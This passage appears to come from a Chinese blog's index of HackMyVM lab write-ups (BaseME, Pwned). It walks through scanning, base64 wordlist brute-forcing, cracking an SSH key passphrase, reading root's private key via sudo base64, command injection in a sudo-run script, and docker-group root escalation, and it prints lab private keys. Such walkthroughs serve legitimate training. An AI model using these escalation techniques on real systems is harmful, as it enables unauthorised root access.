later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.\nType \"show copying\" and \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n    <http://www.gnu.org/software/gdb/documentation/>.\n\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\".\n# id\nid\nuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)\n~~~\n\n发现进到root组里了，提权结束\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-BaseME","url":"/2025/01/22/HackmyVM-BaseME/","content":"\n\n\n\n\n# 信息搜集\n\narp-scan -l \n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.232  08:00:27:d9:d3:0c       PCS Systemtechnik GmbH\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded\n~~~\n\nip为192.168.31.220，nmap扫描端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.232 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 EST\nNmap scan report for baseme (192.168.31.232)\nHost is up (0.0065s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 21.46 seconds\n~~~\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# curl 192.168.31.232\nQUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK\n\n<!--\niloveyou\nyouloveyou\nshelovesyou\nhelovesyou\nweloveyou\ntheyhatesme\n-->\n~~~\n\n给了一串base64和几个字符串\n\nbase64解码内容为：\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# echo \"QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK\"|base64 -d\nALL, absolutely ALL that you need is in BASE64.\nIncluding the password that you need :)\nRemember, BASE64 has the answer to all your questions.\n-lucas\n~~~\n\n可以知道用户名为lucas，并且所有内容都要进行base64。\n\n将字典进行base64编码，然后扫描目录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 >>1;done\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.232\" -w ./1\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.232\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ./1\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/aWRfcnNhCg==         (Status: 200) [Size: 2537]\n/cm9ib3RzLnR4dAo=     (Status: 200) [Size: 25]\nProgress: 4736 / 4737 (99.98%)\n===============================================================\nFinished\n===============================================================\n~~~\n\n这两个文件分别是id_rsa和robots.txt\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# echo \"aWRfcnNhCg==\"|base64 -d\nid_rsa\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# echo \"cm9ib3RzLnR4dAo=\"|base64 -d\nrobots.txt\n~~~\n\nrobots.txt里什么也没有\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# base64 cm9ib3RzLnR4dAo= -d\nNothing here :(\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# base64 aWRfcnNhCg=\\= -d\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YUL\nBtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1\ncbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG\n07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh\n7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyv\nf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4\nvLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5X\nYFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpK\nxkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs\n+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbi\nNNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZ\nzjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0\nIJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDI\npxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJ\nMJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp\n+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mV\ntVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWh\ni6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+\ntSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xw\nN7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuM\nAif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQ\nO+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2\nTLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl\n3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rL\nND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJ\nLdmmRXUS/DtO+69/aidvxGAYob+1M=\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\n80端口给了几个字符串就是字典，base64编码后爆破id_rsa的密码\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat 1|while read line;do for i in $line;echo $i|base64 >>1;done\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat 1\niloveyou\nyouloveyou\nshelovesyou\nhelovesyou\nweloveyou\ntheyhatesme\naWxvdmV5b3UK\neW91bG92ZXlvdQo=\nc2hlbG92ZXN5b3UK\naGVsb3Zlc3lvdQo=\nd2Vsb3ZleW91Cg==\ndGhleWhhdGVzbWUK\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ssh2john id_rsa>1\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# john 1 -w=1\nUsing default input encoding: UTF-8\nLoaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])\nNo password hashes left to crack (see FAQ)\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# john 1 -w=1 --show\nInvalid options combination: \"--show\"\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# john 1  --show\nid_rsa:aWxvdmV5b3UK\n\n1 password hash cracked, 0 left\n~~~\n\nlucas用户的密码就是aWxvdmV5b3UK\n\n# 提权\n\nssh登录拿到user.txt\n\nsudo -l可以无密码运行base64，直接读取/root/root.txt\n\n~~~\nlucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -d\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n                                   .     **\n                                *           *.\n                                              ,*\n                                                 *,\n                         ,                         ,*\n                      .,                              *,\n                    /                                    *\n                 ,*                                        *,\n               /.                                            .*.\n             *                                                  **\n             ,*                                               ,*\n                **                                          *.\n                   **                                    **.\n                     ,*                                **\n                        *,                          ,*\n                           *                      **\n                             *,                .*\n                                *.           **\n                                  **      ,*,\n                                     ** *,\n\nHMVFKBS64\n~~~\n\n想提权到root的话需要读取id_rsa\n\n~~~\nlucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -d\nsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2B\nIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxp\nDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk\n/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7\npx+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9a\nS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ\n7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRx\nYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8v\nzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO\n4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpig\nyLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6\noBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5\nSEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDr\nnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9R\niMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLq\nvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oG\nptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuz\nX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axR\nfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExD\nSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCe\nFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5\nrFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIR\ntxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an\n2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=\n-----END OPENSSH PRIVATE KEY-----\n~~~\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ssh root@192.168.31.232 -i id_rsa\nLinux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Wed Jan 22 08:08:11 2025 from 192.168.31.129\nroot@MiWiFi-RA71-srv:~#\n~~~\n\n# 总结\n\n在处理字典的时候还可以有更高效的方法，其他的就没啥了\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Pwned","url":"/2025/01/22/HackmyVM-Pwned/","content":"\n\n\n\n\n\n\n# 信息搜集\n\narp-scan -l扫描ip\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.51   08:00:27:c4:72:27       PCS Systemtechnik GmbH\n192.168.31.220  46:3e:62:f9:1e:fa       (Unknown: locally administered)\n192.168.31.187  a6:9b:e0:2d:30:9a       (Unknown: locally administered)\n192.168.31.85   7e:2c:58:df:4e:cb       (Unknown: locally administered)\n\n5 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded\n~~~\n\nip为192.168.31.51，然后nmap扫描开放端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# nmap 192.168.31.51 --min-rate=1000 -p-\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 EST\nNmap scan report for pwned (192.168.31.51)\nHost is up (0.00019s latency).\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 13.85 seconds\n~~~\n\n开放了21,22,80端口\n\n# 80端口\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.51\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.51\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/nothing              (Status: 301) [Size: 316] [--> http://192.168.31.51/nothing/]\n/server-status        (Status: 403) [Size: 278]\n/hidden_text          (Status: 301) [Size: 320] [--> http://192.168.31.51/hidden_text/]\nProgress: 220559 / 220560 (100.00%)\n===============================================================\nFinished\n===============================================================\n~~~\n\n/nothing:\n\n~~~\ni said nothing bro\n~~~\n\n/hidden_text:\n\n~~~\n/hacked\n/vanakam_nanba\n/hackerman.gif \n/facebook\n/whatsapp\n/instagram\n/pwned\n/pwned.com\n/pubg \n/cod\n/fortnite\n/youtube\n/kali.org\n/hacked.vuln\n/users.vuln\n/passwd.vuln\n/pwned.vuln\n/backup.vuln\n/.ssh\n/root\n/home\n~~~\n\n利用给的目录扫描\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# gobuster dir -u \"http://192.168.31.51\" -w ./secret.dic\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.31.51\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ./secret.dic\n[+] Negative Status codes:   404\n[+] User Agent:              gobuster/3.6\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/pwned.vuln           (Status: 301) [Size: 319] [--> http://192.168.31.51/pwned.vuln/]\nProgress: 22 / 23 (95.65%)\n===============================================================\nFinished\n===============================================================\n~~~\n\n前端给了源码\n\n~~~\n<?php\n//\tif (isset($_POST['submit'])) {\n//\t\t$un=$_POST['username'];\n//\t\t$pw=$_POST['password'];\n//\n//\tif ($un=='ftpuser' && $pw=='B0ss_B!TcH') {\n//\t\techo \"welcome\"\n//\t\texit();\n// }\n// else \n//\techo \"Invalid creds\"\n// }\n?>\n\n~~~\n\n这是ftp的账号然后登录ftp\n\n# 21端口\n\n~~~\nftp> ls -la\n229 Entering Extended Passive Mode (|||48619|)\n150 Here comes the directory listing.\ndrwxrwxrwx    3 0        0            4096 Jul 09  2020 .\ndrwxr-xr-x    5 0        0            4096 Jul 10  2020 ..\ndrwxr-xr-x    2 0        0            4096 Jul 10  2020 share\n~~~\n\n有一个share文件夹，文件夹有id_rsa和note.txt\n\n~~~\nftp> ls\n229 Entering Extended Passive Mode (|||53927|)\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa\n-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt\n226 Directory send OK.\n~~~\n\nget下载下来\n\n~~~\nftp> get id_rsa\nlocal: id_rsa remote: id_rsa\n229 Entering Extended Passive Mode (|||26918|)\n150 Opening BINARY mode data connection for id_rsa (2602 bytes).\n100% |***************************************************************************|  2602      350.29 KiB/s    00:00 ETA\n226 Transfer complete.\n2602 bytes received in 00:00 (308.45 KiB/s)\nftp> get note.txt\nlocal: note.txt remote: note.txt\n229 Entering Extended Passive Mode (|||52418|)\n150 Opening BINARY mode data connection for note.txt (75 bytes).\n100% |***************************************************************************|    75       34.79 KiB/s    00:00 ETA\n226 Transfer complete.\n75 bytes received in 00:00 (21.66 KiB/s)\n~~~\n\n文件内容\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat id_rsa\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# cat note.txt\n\nWow you are here\n\nariana won't happy about this note\n\nsorry ariana :(\n~~~\n\n给了ssh的私钥和用户名,给id_rsa文件600的权限然后登录\n\n~~~\n┌──(root㉿kali)-[~/Desktop/tmp]\n└─# ssh ariana@192.168.31.51 -i id_rsa\nThe authenticity of host '192.168.31.51 (192.168.31.51)' can't be established.\nED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.31.51' (ED25519) to the list of known hosts.\nLinux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Fri Jul 10 13:03:23 2020 from 192.168.18.70\nariana@pwned:~$ ls\nariana-personal.diary  user1.txt\n~~~\n\n# 提权\n\n~~~\nariana@pwned:/$ sudo -l\nMatching Defaults entries for ariana on pwned:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser ariana may run the following commands on pwned:\n    (selena) NOPASSWD: /home/messenger.sh\n~~~\n\n可以以selena用户，无密码运行/home/messenger.sh\n\nmessenger.sh的内容：\n\n~~~\nariana@pwned:/home$ cat messenger.sh\n#!/bin/bash\n\nclear\necho \"Welcome to linux.messenger \"\n                echo \"\"\nusers=$(cat /etc/passwd | grep home |  cut -d/ -f 3)\n                echo \"\"\necho \"$users\"\n                echo \"\"\nread -p \"Enter username to send message : \" name\n                echo \"\"\nread -p \"Enter message for $name :\" msg\n                echo \"\"\necho \"Sending message to $name \"\n\n$msg 2> /dev/null\n\n                echo \"\"\necho \"Message sent to $name :) \"\n                echo \"\"\n~~~\n\n直接sudo运行可以提权到selena，然后用python获取伪终端\n\n~~~\nariana@pwned:/home$ sudo -u selena /home/messenger.sh\nWelcome to linux.messenger\n\n\nariana:\nselena:\nftpuser:\n\nEnter username to send message : selena\n\nEnter message for selena :bash\n\nSending message to selena\nid\nuid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nselena@pwned:/home$\n~~~\n\nselena的主目录下有一个user2.txt\n\n通过id能看到用户在docker组里\n\n~~~\nselena@pwned:/$ id\nuid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)\n~~~\n\n~~~\nselena@pwned:/$ docker images\nREPOSITORY          TAG                 IMAGE ID            CREATED             SIZE\nprivesc             latest              09ae39f0f8fc        4 years ago         88.3MB\n<none>              <none>              e13ad046d435        4 years ago         88.3MB\nalpine              latest              a24bb4013296        4 years ago         5.57MB\ndebian              wheezy              10fcec6d95c4        5 years ago         88.3MB\n~~~\n\n[docker提权](https://gtfobins.github.io/gtfobins/docker/)\n\n~~~\nselena@pwned:/$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh\nid\n# uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)\n~~~\n\n提权成功\n\n# 总结\n\n默认情况下，Docker 软件包是会默认添加一个 docker 用户组的。Docker 守护进程会允许 root 用户和 docker组用户访问 Docker，给用户提供 Docker 权限；用户在docker组里就可以免sudo运行docker，而容器内默认是root用户，用-v选项将用户外的目录映射到容器内既可以以root用户去修改文件\n","tags":["靶机"],"categories":["HackMyVM"]},{"title":"HackmyVM-Gift","url":"/2025/01/22/HackmyVM-Gift/","content":"\n\n\n\n\n\n\n\n\n\n\n# 信息搜集\n\n用arp-scan扫描\n\n~~~shell\n┌──(root㉿kali)-[~]\n└─# arp-scan -l\nInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.31.1    a4:a9:30:df:ef:44       (Unknown)\n192.168.31.200  